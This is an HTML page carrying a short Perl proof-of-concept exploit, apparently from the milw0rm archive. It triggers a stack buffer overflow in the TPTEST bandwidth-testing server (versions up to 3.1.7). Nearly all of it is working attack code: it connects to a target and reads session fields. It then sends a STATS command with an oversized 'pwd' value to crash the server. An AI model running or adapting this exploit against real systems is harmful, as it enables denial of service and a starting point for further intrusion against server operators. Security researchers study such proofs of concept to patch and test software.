<html><head><title>TPTEST <= 3.1.7 Stack Buffer Overflow PoC</title></head><pre>#!/usr/local/bin/perl

# TPTEST &lt;= 3.1.7 (maby also 5.0.2?)
# tptest.sourceforge.net
# stackbased buffer overflow poc in server (client can also be exploit)
# author: ffwd

use IO::Socket;($host,$port)=@ARGV;
$rem=IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;$host,PeerPort=&gt;$port);
if(!$rem){die &quot;1\n&quot;;}$rem-&gt;autoflush(1);
$cookie=$major=$minor=&quot;123&quot;;
$r=&lt;$rem&gt;;print &quot;$r&quot;;sleep 5; # to attach in gdb..
if($r=~/cookie=([0-9]*)/){$cookie=$1;}
if($r=~/vmajor=([0-9]*)/){$major=$1;}
if($r=~/vminor=([0-9]*)/){$minor=$1;}
$s=&quot;TEST vmajor=$major;vminor=$minor;mode=4;timeout=60;tcpbytes=0;cookie=$cookie;client=\r\n&quot;;
print &quot;$s&quot;;print $rem &quot;$s&quot;;$rr=&lt;$rem&gt;;print &quot;$rr&quot;;
if($rr=~/^210 tcpdataport=([0-9]*)/)
{$data=$1;$remm=IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;$host,PeerPort=&gt;$data);
if(!$remm){die &quot;2\n&quot;;}}
$ss=&quot;STATS majorv=$major;minorv=$minor;pktssent=0;pktsunsent=0;pktsrcvd=0;bytessent=51200;bytesrcvd=0;&quot;.
&quot;maxrtt=0;minrtt=999999999;totrtt=0;nortt=0;oocount=0;txstart_s=7274757975;txstart_us=717574;&quot;.
&quot;txstop_s=7274757975;txstop_us=717173;rxstart_s=0;rxstart_us=0;rxstop_s=0;rxstop_us=0;email=;pwd=&quot;.
(&quot;A&quot;x42).&quot;\r\n&quot;; # buffer overflow!
print &quot;$ss&quot;;print $rem &quot;$ss&quot;;
print while &lt;$rem&gt;;

# milw0rm.com [2009-02-16]</pre></html>